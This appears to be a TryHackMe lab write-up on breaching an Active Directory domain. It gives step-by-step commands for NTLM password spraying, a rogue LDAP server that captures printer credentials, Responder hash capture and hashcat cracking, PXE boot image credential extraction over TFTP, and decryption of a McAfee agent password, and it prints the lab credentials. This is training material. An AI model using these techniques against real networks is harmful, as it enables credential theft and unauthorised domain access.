'''scope
THMDC - 10.200.25.101
THMMDT - 10.200.25.202

Webapp at http://ntlmauth.za.tryhackme.com/
Printer at http://printer.za.tryhackme.com/settings.aspx
PXE Boot files at http://pxeboot.za.tryhackme.com/
'''

## Exploitation:
- Added the DNS IP address of THMDC in `/etc/systemd/resolved.conf`
- Restarted the service
```bash
systemctl restart systemd-resolved
```

- If this didnt work revert the file `/etc/systemd/resolved.conf` to normal and add the IP in `/etc/resolv.conf` as nameserver
---------------------------------------------------------------------------------
- Found usernames given in task
- Used this to password spray the password `Changeme123` on the website in scope
```bash
python ntlm_passwordspray.py -u usernames.txt -f za.tryhackme.com -p Changeme123 -a http://ntlmauth.za.tryhackme.com/
```

- Found 4 valid usernames
```
hollie.powell
heather.smith
gordon.stevens
georgina.edwards
```
---------------------------------------------------------------------------------
- The printer website in scope has open admin panel
- Asks for LDAP creds and server to change IP
- Added our IP address and clicked `Test Stttings`
- Started a `netcat` server on LDAP port
```bash
nc -lvnp 389
```

- The answer we recive contains a `supportedCapabilities` which means it needs more than authentication
- We can setup our rouge LDAP server for that
- Used `slapd` to configure a rouge LDAP server
```bash
## Added the DNS domain name and Organization name as `za.tryhackme.com`
sudo dpkg-reconfigure -p low slapd

## Start the service
sudo service slapd start
```

- Used this to capture credentials
```bash
sudo tcpdump -SX -i tun0 tcp port 389
```

- Sent the creds using printer admin panel to our IP as the server
- Got the error `LDAP Connection failed: The distinguished name contains invalid syntax.`
- But got the creds on `tcpdump`
```bash
za.tryhackme.com\svcLDAP:tryhackmeldappass1@
```
---------------------------------------------------------------------------------
- Used `responder` to intercept for NTLM connections
```bash
sudo responder -I tun0
```

- Got one for `svcFileCopy`
- Cracked the hash
```bash
hashcat -m 5600 NTLM.hash passwordlist.txt --force
```

- Got the password
	svcFileCopy:FPassword1!
---------------------------------------------------------------------------------
- Got the list of BCD files from http://pxeboot.za.tryhackme.com/
- We have SSH access in `THMJMP1.za.tryhackme.com` with password `Password1@`
```bash
ssh thm@THMJMP1.za.tryhackme.com
```

- Logged in
- Got the `powerpxe` tools from `github` and moved them here
- We need the THMMDT IP address
- Got it using
```bash
nslookup thmmdt.za.tryhackme.com
```

- Used this command in SSH session to get BCD files
```bash
tftp -i 10.200.25.202 GET "\Tmp\x64{1EADDB3F-F416-4CB5-9E3D-9F4886D52890}.bcd" conf.bcd
```

- Used these commands to get information using `powerpxe`
```bash
powershell
Import-Module .\PowerPXE.ps1
$BCDFile = "conf.bcd"
Get-WimFile -bcdFile $BCDFile
```

- Got the path of `wim` file
```
\Boot\x64\Images\LiteTouchPE_x64.wim  
```

- We can again use TFTP to get it
```bash
tftp -i 10.200.25.202 GET "\Boot\x64\Images\LiteTouchPE_x64.wim" pxeboot.wim
```

- Then we can use this to extract the credentials
```bash
Get-FindCredentials -WimFile pxeboot.wim
```

- Found them
```bash
>>>> >>>> DeployRoot = \\THMMDT\MTDBuildLab$ 
>>>> >>>> UserID = svcMDT                
>>>> >>>> UserDomain = ZA                
>>>> >>>> UserPassword = PXEBootSecure1@ 
```
---------------------------------------------------------------------------------
- Found a database file of McAfee Endpoint Security in `C:\ProgramData\McAfee\Agent\DB` as `ma.db`
- Used this command to send the file over to us using `scp`
```bash
scp thm@THMJMP1.za.tryhackme.com:C:/ProgramData/McAfee/Agent/DB/ma.db .
```

- Used this to open it
```bash
sqlitebrowser ma.db
```

- Found a AD username and encrypted password in `AGENT_REPOSITORIES`
- Decrypted it using
```bash
python2 mcafee_sitelist_pwd_decrypt.py 'jWbTyS7BL1Hj7PkO5Di/QhhYmcGj5cOoZ2OkDTrFXsR/abAFPM9B3Q=='
```

- Cracked it
	svcAV:MyStrongPassword!
---------------------------------------------------------------------------------